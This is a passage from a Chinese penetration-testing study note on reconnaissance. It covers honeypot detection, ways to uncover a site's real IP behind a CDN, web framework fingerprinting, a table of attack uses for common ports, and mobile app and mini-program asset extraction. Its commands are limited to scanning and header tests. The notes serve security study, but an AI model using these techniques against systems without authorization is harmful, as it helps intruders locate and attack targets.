id=\"6-蜜罐\">6.蜜罐</h4>\n<ul>\n<li>\n<p><strong>概念</strong>：蜜罐是一种安全威胁的检测技术，其本质在于引诱个欺骗攻击者，并且通过记录攻击者的攻击日志来产生价值。安全研究人员可以通过分析蜜罐的被攻击记录推测攻击者的意图和手段等信息。攻击方可以通过蜜罐识别技术来发现和规避蜜罐。因此，我们有必要站在红队的角度钻研蜜罐识别的方式方法</p>\n</li>\n<li>\n<p><strong>识别</strong>：指纹识别，网络空间识别，常用端口，连续端口等。</p>\n</li>\n<li>\n<p><strong>技术分类与特点</strong>：</p>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><strong>类型</strong></th>\n<th style=\"text-align:center\"><strong>交互层级</strong></th>\n<th style=\"text-align:center\"><strong>优势与局限</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><strong>低交互蜜罐</strong></td>\n<td style=\"text-align:center\">模拟基础服务响应</td>\n<td style=\"text-align:center\">部署简单、低风险，但易被识别（如 Honeyd）。</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>高交互蜜罐</strong></td>\n<td style=\"text-align:center\">运行完整 OS/应用</td>\n<td style=\"text-align:center\">捕获深度攻击数据，但维护成本高（如 Nepenthes）。</td>\n</tr>\n</tbody>\n</table>\n<p><img src=\"https://mmbiz.qpic.cn/mmbiz_jpg/4yJaCArQwpCuHOCFU1vY3hHVxTDydrfkTDFxLSGwapfnfoTQhELR6rRrIMtJX7T9j0gjuct5Cw18lTLe5lrhjA/640?wx_fmt=jpeg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1\" alt=\"图片\"></p>\n<h4 id=\"7-CDN-绕过\">7.CDN 绕过</h4>\n<h5 id=\"一、CDN-介绍\">一、CDN 介绍</h5>\n<p>（1）<strong>前置知识</strong></p>\n<ul>\n<li>\n<p><strong>传统访问</strong>：用户访问域名–&gt; 解析服务器 IP–&gt; 访问目标主机</p>\n</li>\n<li>\n<p><strong>普通 CDN</strong>：用户访问域名–&gt; CDN 节点–&gt; 真实服务器 IP–&gt; 访问目标主机</p>\n</li>\n<li>\n<p><strong>带 WAF 的 CDN</strong>：用户访问域名–&gt; CDN 节点（WAF）–&gt; 真实服务器 IP–&gt; 访问目标主机</p>\n</li>\n</ul>\n<p>（2）<strong>CDN 的三种配置</strong></p>\n<ul>\n<li>配置 1：加速域名-需要启用加速的域名</li>\n<li>配置 2：加速区域-需要启用加速的地区</li>\n<li>配置 3：加速类型-需要启用加速的资源</li>\n</ul>\n<p>（3）<strong>CDN 核心作用与绕过必要性</strong></p>\n<p>1.<strong>CDN 的核心功能</strong></p>\n<ul>\n<li><strong>隐藏源站 IP</strong>：通过边缘节点代理用户请求，使攻击者无法直接定位真实服务器。</li>\n<li><strong>加速与负载均衡</strong>：缓存静态资源，减少源站压力，提升访问速度</li>\n<li><strong>安全防护</strong>：集成 WAF、DDoS 防御等能力（如 Cloudflare）</li>\n</ul>\n<p>2.<strong>为何要绕过 CDN</strong></p>\n<ul>\n<li><strong>渗透测试需求</strong>：定位真实 IP 以测试源站漏洞（如未修复的 0day）。</li>\n<li><strong>应急响应</strong>：当 CDN 节点故障时，需直接访问源站排查问题。</li>\n</ul>\n<p>（4）<strong>识别</strong></p>\n<ul>\n<li>nslookup（不重要）</li>\n<li>多地服务器 ping 判断</li>\n</ul>\n<h5 id=\"二、绕过方法\">二、绕过方法</h5>\n<h6 id=\"1-子域名挖掘\">1.子域名挖掘</h6>\n<ul>\n<li><strong>原理</strong>：主站启用 CDN，但子域名（如 <code>mail.example.com</code>）常因配置遗漏暴露真实 IP。</li>\n<li><strong>操作</strong>：ping 子域名得到不一样的 ip，然后查看备案，如果感觉像，就尝试 host（hosts Administrator）绑定 ip，ping 下主域名，强制解析到那个 ip 上</li>\n</ul>\n<h6 id=\"2-历史-DNS-记录查询（老域名适用）\">2.历史 DNS 记录查询（老域名适用）</h6>\n<ul>\n<li><strong>原理</strong>：域名启用 CDN 前的解析记录可能留存于公共数据库。</li>\n<li><strong>工具与平台</strong>：\n<ul>\n<li><strong>SecurityTrails</strong>：查看历史 A 记录，过滤 CDN IP</li>\n<li><strong>ViewDNS</strong>：提供 10 年内的解析历史</li>\n<li><strong>微步在线</strong>：国内域名历史记录精准</li>\n</ul>\n</li>\n<li><strong>技巧</strong>：优先选择 <strong>最早解析的 IP</strong>，大概率是源站。</li>\n</ul>\n<h6 id=\"3-SSL-证书反查\">3.SSL 证书反查</h6>\n<ul>\n<li><strong>原理</strong>：同一服务器证书可能关联多个域名，暴露真实 IP。</li>\n<li><strong>操作</strong>：\n<ul>\n<li>访问 <code>https://example.com</code> 获取证书 HASH。</li>\n<li>在 <strong>Censys</strong> 搜索 <code>parsed.names: example.com</code>，筛选 IP 归属。</li>\n</ul>\n</li>\n<li><strong>优势</strong>：绕过 CDN 缓存，直接定位服务器。</li>\n</ul>\n<h6 id=\"4-国外节点访问\">4.国外节点访问</h6>\n<ul>\n<li><strong>原理</strong>：企业 CDN 可能未覆盖冷门地区（如南美、非洲），直连源站</li>\n<li><strong>实操</strong>：\n<ul>\n<li><strong>工具</strong>：使用国外 VPS（如 AWS 巴西节点）直接访问目标域名。</li>\n<li><strong>在线平台</strong>：<code>tools.ipip.net/cdn.php</code> 模拟全球 Ping 测试。</li>\n</ul>\n</li>\n<li><strong>注意</strong>：部分 CDN 已支持全球覆盖，需结合其他方法验证。</li>\n</ul>\n<h6 id=\"5-邮件服务溯源\">5.邮件服务溯源</h6>\n<ul>\n<li><strong>原理</strong>：企业邮箱（如 <code>admin@example.com</code>）发送邮件时，邮件头常含源站 IP。</li>\n<li><strong>步骤</strong>：\n<ul>\n<li>1.触发邮件（密码重置/RSS 订阅）。</li>\n<li>2.查看邮件原文，搜索 <code>Received:</code> 字段：</li>\n</ul>\n</li>\n<li><strong>其他方法</strong>：通过发送错误邮件，让他的真实 ip 给你返回错误的信息，但需要有一个自己的收邮箱的服务器（qq 邮箱等不行）</li>\n</ul>\n<h6 id=\"6-网络空间获取\">6.网络空间获取</h6>\n<ul>\n<li>不准，但可以与自己找到的进行对比验证</li>\n</ul>\n<h6 id=\"7-全面扫描\">7.<strong>全面扫描</strong></h6>\n<ul>\n<li><strong>原理</strong>：扫描全网 IP，匹配目标特征（如 favicon 哈希、HTTP 标题）</li>\n<li><strong>操作</strong>：先确定是什么 cdn 提供服务，然后用纯真库找对应 cdn 大概位置的 ip 范围，然后将网站标题写入进去，进行扫描开放的端口对比信息，拿到真实 ip</li>\n<li><strong>局限</strong>：耗时长，易触发安全告警。</li>\n</ul>\n<h6 id=\"8-非标准端口探测\">8.非标准端口探测</h6>\n<ul>\n<li><strong>原理</strong>：CDN 通常只代理 80/443 端口，SSH(22)、RDP(3389)等端口直连源站</li>\n<li><strong>操作</strong>：</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -sS -p22,3389,3306 example.com  <span class=\"comment\"># 扫描非Web端口</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>案例</strong>：某银行主站 CDN 防护，但 3389 端口开放且 IP 非 CDN 段，暴露源站.</li>\n</ul>\n<h6 id=\"9-HTTP-标头篡改\">9.HTTP 标头篡改</h6>\n<ul>\n<li><strong>原理</strong>：篡改 <code>Host</code> 头，诱使 CDN 返回源站错误信息。</li>\n<li><strong>测试命令</strong>：</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -H <span class=\"string\">&quot;Host: example.com&quot;</span> http://CDN_IP -v</span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>成功标志</strong>：返回 <code>404</code> 或源站特有错误页。</li>\n</ul>\n<h6 id=\"10-协议差异绕过\">10.协议差异绕过</h6>\n<ul>\n<li><strong>场景</strong>：CDN 仅配置 HTTPS 时，访问 HTTP 可能直连源站</li>\n<li><strong>验证</strong>：</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl http://example.com  <span class=\"comment\"># 返回真实IP或错误信息</span></span><br></pre></td></tr></table></figure>\n<h6 id=\"11-总结\">11.总结</h6>\n<p>📊 <strong>方法对比与工具推荐</strong></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><strong>方法</strong></th>\n<th style=\"text-align:center\"><strong>适用场景</strong></th>\n<th style=\"text-align:center\"><strong>工具推荐</strong></th>\n<th style=\"text-align:center\"><strong>成功率</strong></th>\n<th style=\"text-align:center\"><strong>操作难度</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">子域名挖掘</td>\n<td style=\"text-align:center\">多子域名企业</td>\n<td style=\"text-align:center\">Sublist3r + Dig</td>\n<td style=\"text-align:center\">★★★★☆</td>\n<td style=\"text-align:center\">★★☆☆☆</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">历史 DNS 查询</td>\n<td style=\"text-align:center\">运营超 1 年的老域名</td>\n<td style=\"text-align:center\">SecurityTrails</td>\n<td style=\"text-align:center\">★★★☆☆</td>\n<td style=\"text-align:center\">★☆☆☆☆</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">邮件溯源</td>\n<td style=\"text-align:center\">自建邮箱系统</td>\n<td style=\"text-align:center\">手动触发+邮件头分析</td>\n<td style=\"text-align:center\">★★★★☆</td>\n<td style=\"text-align:center\">★★☆☆☆</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">国外访问</td>\n<td style=\"text-align:center\">未覆盖全球的 CDN</td>\n<td style=\"text-align:center\">VPS + cURL</td>\n<td style=\"text-align:center\">★★☆☆☆</td>\n<td style=\"text-align:center\">★★★☆☆</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">全网扫描</td>\n<td style=\"text-align:center\">特征明显的网站</td>\n<td style=\"text-align:center\">Masscan + FOFA</td>\n<td style=\"text-align:center\">★★★★★</td>\n<td style=\"text-align:center\">★★★★☆</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">非标准端口探测</td>\n<td style=\"text-align:center\">多端口服务</td>\n<td style=\"text-align:center\">Nmap</td>\n<td style=\"text-align:center\">★★★☆☆</td>\n<td style=\"text-align:center\">★★★☆☆</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li><strong>首选组合</strong>：<code>子域名挖掘 + 历史DNS查询 + 邮件溯源</code> 覆盖 90%场景。</li>\n<li><strong>高阶突破</strong>：特征扫描（favicon/证书）适用于顽固目标。</li>\n</ul>\n<h4 id=\"8-框架组件\">8.框架组件</h4>\n<h5 id=\"一、基础内容\">一、基础内容</h5>\n<ul>\n<li>\n<p><strong>框架</strong>：简单代码的一个整合库，如果使用框架就只需要学习使用框架调用即可如：文件上传功能是需要很多代码来实现的，框架把这个代码进行封封装，调用即可影响：如果采用框架开发，代码的安全性是取决于框架的过滤机制</p>\n</li>\n<li>\n<p><strong>组件</strong>：第三方的功能模块（日志记录，数据监控，数据转换等）</p>\n</li>\n<li>\n<p><strong>Web 架构</strong>：</p>\n<ul>\n<li>1、最简单最入门的开发模型（功能代码全部手写）\n<ul>\n<li>最容易出现漏洞，程序员水平不一，没有第三方或团队的检测，单纯的自己写</li>\n</ul>\n</li>\n<li>2、结合开发框架的开发模型（以框架为核心实现功能）\n<ul>\n<li>第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架漏洞）</li>\n</ul>\n</li>\n<li>3、结合开发框架外加组件模型（以框架为核心，组件为辅实现功能）\n<ul>\n<li>第三方或团队的开发的封装代码框架，一般内置的过滤机制（框架和组件漏洞）</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"二、框架识别特征\">二、框架识别特征</h5>\n<h6 id=\"python-开发框架\">python-开发框架</h6>\n<ul>\n<li>\n<p><strong>Django</strong>：识别插件，Set-Cookie: expires =</p>\n</li>\n<li>\n<p><strong>Flask</strong>：识别插件，Set-Cookie: expires =</p>\n</li>\n</ul>\n<h6 id=\"PHP-开发框架\">PHP-开发框架</h6>\n<ul>\n<li>ThinkPHP：\n<ul>\n<li>识别插件</li>\n<li>X-Powered-By：ThinkPHP</li>\n<li>CMS 识别到源码体系 TP 开发</li>\n</ul>\n</li>\n<li>Laravel：识别插件，Set-Cookie 中特征的格式</li>\n<li>Yii：识别插件，Set-Cookie 中特征的格式</li>\n</ul>\n<h6 id=\"JAVA-开发框架\">JAVA-开发框架</h6>\n<ul>\n<li>Fastjson/Jackson：\n<ul>\n<li>在提交 JSON 数据包中修改测试，Fastjson 组件会把 01 解析成 1，Jackson 组件在解析 01 是会抛出异常</li>\n<li><a href=\"https://forum.butian.net/share/1679\">https://forum.butian.net/share/1679</a></li>\n<li><a href=\"https://www.iculture.cc/forum-post/24115.html\">https://www.iculture.cc/forum-post/24115.html</a></li>\n</ul>\n</li>\n<li>Shiro：\n<ul>\n<li>请求包的 cookie 中存在 rememberMe 字段。</li>\n<li>返回包中存在 set-Cookie：<strong>rememberMe = deleteMe</strong></li>\n<li>请求包中存在 rememberMe = x 时，响应包中存在 rememberMe = deleteMe</li>\n<li>有时候服务器不会主动返回 rememberMe = deleteMe, 直接发包即可，将 Cookie 内容改为 rememberMe = 1，若相应包有 rememberMe = deleteMe，则基本可以确定网站是 apache shiro 搭建的</li>\n</ul>\n</li>\n<li>Strusts2：一般使用 struts2 框架后缀带 do 或 action，可以尝试进行利用</li>\n<li>Springboot：\n<ul>\n<li>通过 web 应用程序网页标签的小绿叶图标</li>\n<li>通过 Springboot 框架默认报错页面</li>\n</ul>\n</li>\n<li>Solr：一般开放 8983 端口，访问页面也可以探针到</li>\n</ul>\n<h3 id=\"二、主机服务器\">二、主机服务器</h3>\n<h4 id=\"1-端口扫描\">1.端口扫描</h4>\n<ul>\n<li>\n<p><strong>基础概念</strong>：在计算机网络通信中，端口是应用程序或服务用于监听传入连接或发送传出数据的逻辑端点。每个端口都由一个 16 位的数字标识，范围从 0 到 65535</p>\n</li>\n<li>\n<p><strong>端口的重要性</strong>：</p>\n<ul>\n<li><strong>服务识别</strong>：特定端口通常与特定服务关联，例如，80 端口用于 HTTP 服务，443 端口用于 HTTPS 服务，22 端口用于 SSH 服务。通过识别开放端口，我们可以推断目标系统可能提供的功能。</li>\n<li><strong>安全评估</strong>：开放了不必要的端口或运行着已知漏洞的服务，都可能成为攻击者的入口。端口扫描是安全审计和渗透测试的第一步。</li>\n<li><strong>网络故障排查</strong>：确定服务是否正常运行，可以通过检查其监听的端口状态来判断。</li>\n</ul>\n</li>\n<li>\n<p><strong>端口分类</strong>：</p>\n<ul>\n<li><strong>知名端口(Well-Known Ports)</strong>：0-1023，由 IANA(Internet Assigned Numbers Authority)分配和控制，用于常见的网络服务，如 HTTP(80), FTP(21), SSH(22)等。</li>\n<li><strong>注册端口(Registered Ports)</strong>：1024-49151，可由用户或应用程序注册，用于特定的应用程序或服务。</li>\n<li><strong>动态/私有端口(Dynamic/Private Ports)</strong>：49152-65535，通常由客户端程序随机选择，用于临时通信。</li>\n</ul>\n</li>\n<li>\n<p><strong>端口扫描工具</strong>：Nmap（综合）、Masscan（快速）、网络空间（方便）</p>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\"><strong>端口</strong></th>\n<th style=\"text-align:center\"><strong>协议</strong></th>\n<th style=\"text-align:center\"><strong>服务</strong></th>\n<th style=\"text-align:center\"><strong>渗透用途</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\"><strong>20,21</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">FTP</td>\n<td style=\"text-align:center\">匿名上传下载、爆破、嗅探、Windows 提权、远程执行（如 proftpd 1.3.5）、后门利用（如 vsftpd 2.3.4）</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>22</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">SSH</td>\n<td style=\"text-align:center\">爆破、SSHv1 中间人攻击、隧道代理、内网转发、文件传输</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>23</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">Telnet</td>\n<td style=\"text-align:center\">爆破、嗅探（常见于路由器/交换机弱口令）</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>25</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">SMTP</td>\n<td style=\"text-align:center\">邮件伪造、<code>VRFY/EXPN</code> 用户枚举（工具：smtp-user-enum）</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>53</strong></td>\n<td style=\"text-align:center\">TCP/UDP</td>\n<td style=\"text-align:center\">DNS</td>\n<td style=\"text-align:center\">区域传送劫持、DNS 投毒、欺骗、DNS 隧道远控</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>69</strong></td>\n<td style=\"text-align:center\">TCP/UDP</td>\n<td style=\"text-align:center\">TFTP</td>\n<td style=\"text-align:center\">下载重要配置文件（如网络设备配置）</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>80-89, 443</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">Web 服务</td>\n<td style=\"text-align:center\">Web 漏洞利用（注入、XSS、框架漏洞）、控制台爆破（如 OWA, VPN, Webmail）</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>110</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">POP3</td>\n<td style=\"text-align:center\">爆破、嗅探</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>111, 2049</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">NFS</td>\n<td style=\"text-align:center\">权限配置不当导致未授权访问</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>137,139,445</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">Samba</td>\n<td style=\"text-align:center\">爆破、漏洞利用（MS08-067, MS17-010）、嗅探</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>143</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">IMAP</td>\n<td style=\"text-align:center\">爆破 <strong>5</strong></td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>161</strong></td>\n<td style=\"text-align:center\">UDP</td>\n<td style=\"text-align:center\">SNMP</td>\n<td style=\"text-align:center\">默认团体字符串爆破、内网信息搜集</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>389</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">LDAP</td>\n<td style=\"text-align:center\">注入、匿名访问、弱口令</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>512-514</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">Linux rexec</td>\n<td style=\"text-align:center\">爆破、<code>rlogin</code> 登录</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>873</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">Rsync</td>\n<td style=\"text-align:center\">匿名访问、文件上传</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>1194</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">OpenVPN</td>\n<td style=\"text-align:center\">钓取 VPN 账号进入内网</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>1352</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">Lotus</td>\n<td style=\"text-align:center\">弱口令、信息泄漏</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>1433</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">SQL Server</td>\n<td style=\"text-align:center\">注入、提权、<code>sa</code> 弱口令爆破</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>1521</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">Oracle</td>\n<td style=\"text-align:center\">TNS 协议爆破、注入、反弹 Shell</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>1723</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">PPTP</td>\n<td style=\"text-align:center\">爆破、钓取 VPN 账号</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>2181</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">ZooKeeper</td>\n<td style=\"text-align:center\">未授权访问</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>3306</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">MySQL</td>\n<td style=\"text-align:center\">注入、提权、弱口令爆破</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>3389</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">RDP</td>\n<td style=\"text-align:center\">Shift 后门（Windows Server 2003 以下）、爆破、MS12-020 漏洞</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>3690</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">SVN</td>\n<td style=\"text-align:center\">源码泄露、未授权访问</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>4848</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">GlassFish</td>\n<td style=\"text-align:center\">弱口令</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>5432</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">PostgreSQL</td>\n<td style=\"text-align:center\">爆破、注入、弱口令</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>5900-5902</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">VNC</td>\n<td style=\"text-align:center\">弱口令爆破</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>5984</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">CouchDB</td>\n<td style=\"text-align:center\">未授权导致的任意指令执行</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>6379</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">Redis</td>\n<td style=\"text-align:center\">未授权访问、弱口令爆破</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>7001-7002</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">WebLogic</td>\n<td style=\"text-align:center\">Java 反序列化、弱口令</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>8080-8089</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">Jenkins/JBoss</td>\n<td style=\"text-align:center\">反序列化、控制台弱口令</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>9200,9300</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">ElasticSearch</td>\n<td style=\"text-align:center\">远程代码执行（如 CVE-2015-1427）</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>11211</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">Memcached</td>\n<td style=\"text-align:center\">未授权访问（可被用于 DDoS 放大攻击）</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>27017-27018</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">MongoDB</td>\n<td style=\"text-align:center\">爆破、未授权访问</td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><strong>50070,50030</strong></td>\n<td style=\"text-align:center\">TCP</td>\n<td style=\"text-align:center\">Hadoop</td>\n<td style=\"text-align:center\">默认端口未授权访问（如信息泄露）</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"三、APP-应用\">三、APP 应用</h3>\n<h4 id=\"1-信息分类\">1.信息分类</h4>\n<ul>\n<li><strong>资产信息</strong>：\n<ul>\n<li>ip-端口服务、域名-Web 安全、接口-API 安全</li>\n</ul>\n</li>\n<li><strong>泄露信息</strong>：\n<ul>\n<li>邮箱配置、接口配置、oss 配置</li>\n</ul>\n</li>\n<li><strong>代码信息</strong>：\n<ul>\n<li>JAVA 代码安全问题</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"2-获取-APP\">2.获取 APP</h4>\n<ul>\n<li><strong>从名称获取 APP 信息</strong>：爱企查、小蓝本、七麦、<strong>点点</strong></li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.xiaolanben.com/</span><br><span class=\"line\">https://aiqicha.baidu.com/</span><br><span class=\"line\">https://www.qimai.cn/</span><br><span class=\"line\">https://app.diandian.com/</span><br></pre></td></tr></table></figure>\n<ul>\n<li><strong>URL 获取 APP 信息</strong>：\n<ul>\n<li>查备案信息在搜</li>\n<li>网站上有 APP 下载</li>\n<li>市场直接搜单位名称</li>\n</ul>\n</li>\n</ul>\n<h4 id=\"3-提取技术\">3.提取技术</h4>\n<ul>\n<li><strong>三种方式及其表现</strong>：\n<ul>\n<li>抓包-动态表现</li>\n<li>提取-静态表现&amp;动态调试</li>\n<li>搜索-静态表现</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"（1）抓包表现出来的数据\">（1）抓包表现出来的数据</h5>\n<ul>\n<li>优点：没有误报</li>\n<li>缺点，无法做到完整</li>\n</ul>\n<h5 id=\"（2）反编译从源码中提取数据\">（2）反编译从源码中提取数据</h5>\n<ul>\n<li>优点：数据比较完整</li>\n<li>缺点：有很多无用资产信息</li>\n</ul>\n<h5 id=\"（3）动态调试从表现中提取数据\">（3）动态调试从表现中提取数据</h5>\n<ul>\n<li>\n<p>优点：</p>\n<ul>\n<li>没有误报，解决不能抓包不能代理的情况</li>\n<li>搞逆向的能看到实时的 app 调用链等</li>\n</ul>\n</li>\n<li>\n<p>缺点：无法做到完整</p>\n</li>\n<li>\n<p>案列：某 APP 打开无数据包，登录有数据包（反编译后未找到目标资产，抓包住到了）</p>\n</li>\n<li>\n<p>原因：那个登录界面是 APP 打包的资源，并没有对外发送数据</p>\n</li>\n<li>\n<p>静态分析工具：</p>\n<ul>\n<li>Mobsf（也可以动态调试+模拟器）</li>\n<li>AppInfoScanner</li>\n<li>在线平台：<code>https://www.zhihuaspace.cn:8888/</code>、<code>https: / /mogua.co/</code></li>\n</ul>\n</li>\n</ul>\n<h3 id=\"四、小程序应用\">四、小程序应用</h3>\n<h4 id=\"1-获取小程序\">1.获取小程序</h4>\n<ul>\n<li>直接搜索关键字就行</li>\n<li>常见小程序的应用：微信、支付宝、百度、抖音头条</li>\n</ul>\n<h4 id=\"2-小程序结构\">2.小程序结构</h4>\n<ul>\n<li><strong>主体结构</strong>：小程序包含一个描述整体程序的 app 和多个描述各自页面的 page。一个小程序主体部分(即 app)由三个文件组成，必须放在项目的根目录，如下：</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">文件</th>\n<th style=\"text-align:center\">必需</th>\n<th style=\"text-align:center\">作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">app.js</td>\n<td style=\"text-align:center\">是</td>\n<td style=\"text-align:center\">小程序逻辑</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">app.json</td>\n<td style=\"text-align:center\">是</td>\n<td style=\"text-align:center\">小程序公共配置</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">app.wxss</td>\n<td style=\"text-align:center\">否</td>\n<td style=\"text-align:center\">小程序公共样式表</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>一个小程序页面由四个文件组成，分别是：</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">xxx.js</th>\n<th style=\"text-align:center\">页面</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">xxx.json</td>\n<td style=\"text-align:center\">页面配置</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">xxx.wxml</td>\n<td style=\"text-align:center\">页面结构</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">xxx.wxss</td>\n<td style=\"text-align:center\">页面样式</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>项目整体目录结构：</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>pages</th>\n<th>页面文件夹</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>index</td>\n<td>首页</td>\n</tr>\n<tr>\n<td>logs</td>\n<td>日志</td>\n</tr>\n<tr>\n<td>utils</td>\n<td></td>\n</tr>\n<tr>\n<td>util</td>\n<td>工具类(mina 框架自动生成, 你也可以建立一个：api)</td>\n</tr>\n<tr>\n<td>app.js</td>\n<td>入口 js(类似于 java 类中的 main 方法)、全局 js</td>\n</tr>\n<tr>\n<td>app.json</td>\n<td>全局配置文件</td>\n</tr>\n<tr>\n<td>app.wxss</td>\n<td>全局样式文件</td>\n</tr>\n<tr>\n<td>project.config.json</td>\n<td>跟你在详情中勾选的配置一样</td>\n</tr>\n<tr>\n<td>sitemap.json</td>\n<td>用来配置小程序及其页面是否允许被微信索引</td>\n</tr>\n</tbody>\n</table>\n<h4 